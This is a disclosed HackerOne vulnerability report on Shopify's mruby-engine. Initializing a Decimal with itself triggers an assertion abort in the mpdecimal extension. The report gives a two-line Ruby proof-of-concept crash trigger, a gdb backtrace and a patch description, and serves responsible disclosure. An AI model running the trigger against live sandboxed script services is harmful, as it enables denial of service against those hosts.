# Crash: Initialize Decimal with itself triggers an assertion

## Report Details
- **Report ID**: 185775
- **URL**: https://hackerone.com/reports/185775
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-27T09:39:55.969Z
- **Disclosed**: 2016-12-16T20:24:30.867Z

## Reporter
- **Username**: brakhane
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
When `Decimal` is initialized with itself, a new (empty) `mpd_t` will be created. To fill it with a value, `to_s` of the current instance is called, which accesses the empty `mpd_t`. This triggers an assertion, which leads to a crash.

# Patch
I've created and attached a simple patch which just returns self when a Decimal is initialized with itself. Pretty simple, but should do the job (careful: I've created the patch after a 20h flight, could be... uhm, suboptimal).

# PoC
PoC does work on `https://www.mruby.science/runs`, but as it's not up2date that shouldn't really mean anything.

```
a = Decimal.new
a.initialize a
```

# Trace

```
$ gdb attach 10251
GNU gdb (GDB) 7.12
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
attach: No such file or directory.
Attaching to process 10251
Reading symbols from /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/build/host/bin/mirb...done.
Reading symbols from /usr/lib/libm.so.6...(no debugging symbols found)...done.
Reading symbols from /usr/lib/libreadline.so.7...(no debugging symbols found)...done.
Reading symbols from /usr/lib/libncursesw.so.6...(no debugging symbols found)...done.
Reading symbols from /usr/lib/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.
0x00007f8de487f131 in pselect () from /usr/lib/libc.so.6
(gdb) c
Continuing.

Program received signal SIGABRT, Aborted.
0x00007f8de47d104f in raise () from /usr/lib/libc.so.6
(gdb) bt
#0  0x00007f8de47d104f in raise () from /usr/lib/libc.so.6
#1  0x00007f8de47d247a in abort () from /usr/lib/libc.so.6
#2  0x00007f8de47c9ea7 in __assert_fail_base () from /usr/lib/libc.so.6
#3  0x00007f8de47c9f52 in __assert_fail () from /usr/lib/libc.so.6
#4  0x000000000045a356 in mpd_msword (dec=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:218
#5  mpd_iszero (dec=dec@entry=0xa75980) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/mpdecimal.c:331
#6  0x0000000000472fc0 in mpd_qformat_spec (dec=dec@entry=0xa75980, spec=spec@entry=0x7ffc8fdcd220, ctx=ctx@entry=0x9f8580, 
    status=status@entry=0x7ffc8fdcd28c) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1320
#7  0x00000000004738d5 in mpd_qformat (dec=0xa75980, fmt=fmt@entry=0x481177 "f", ctx=0x9f8580, status=status@entry=0x7ffc8fdcd28c)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/io.c:1390
#8  0x000000000045602a in ext_decimal_to_s (state=0x9b1010, rself=...)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:220
#9  0x000000000040f6af in mrb_funcall_with_block (mrb=mrb@entry=0x9b1010, self=..., mid=<optimized out>, mid@entry=38, argc=<optimized out>, 
    argc@entry=0, argv=argv@entry=0x0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407
#10 0x000000000040fbcc in mrb_funcall_argv (mrb=mrb@entry=0x9b1010, self=..., self@entry=..., mid=mid@entry=38, argc=argc@entry=0, argv=argv@entry=0x0)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424
#11 0x0000000000403d23 in convert_type (raise=1 '\001', method=0x4810cd "to_s", tname=0x4813ea "String", val=..., mrb=0x9b1010)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:316
#12 mrb_convert_type (mrb=mrb@entry=0x9b1010, val=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x4813ea "String", 
    method=method@entry=0x4810cd "to_s") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/object.c:338
#13 0x0000000000455927 in ext_decimal_initialize (state=0x9b1010, self=...)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-mpdecimal/src/ext.c:86
#14 0x000000000041150f in mrb_vm_exec (mrb=mrb@entry=0x9b1010, proc=<optimized out>, proc@entry=0x9b9020, pc=<optimized out>)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#15 0x0000000000416d57 in mrb_vm_run (mrb=mrb@entry=0x9b1010, proc=proc@entry=0x9b9020, self=..., stack_keep=stack_keep@entry=2)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#16 0x00000000004028be in main (argc=<optimized out>, argv=<optimized out>)
    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549
(gdb) info registers
rax            0x0	0
rbx            0x6	6
rcx            0x7f8de47d104f	140247400517711
rdx            0x0	0
rsi            0x7ffc8fdccc30	140722722098224
rdi            0x2	2
rbp            0x4ac565	0x4ac565
rsp            0x7ffc8fdccca8	0x7ffc8fdccca8
r8             0x0	0
r9             0x7ffc8fdccc30	140722722098224
r10            0x8	8
r11            0x246	582
r12            0xda	218
r13            0x4acbb8	4901816
r14            0x0	0
r15            0x7ffc8fdcd220	140722722099744
rip            0x7f8de47d104f	0x7f8de47d104f <raise+207>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) 
```



## Attachments
- 0001-When-initialized-with-itself-return-self.patch
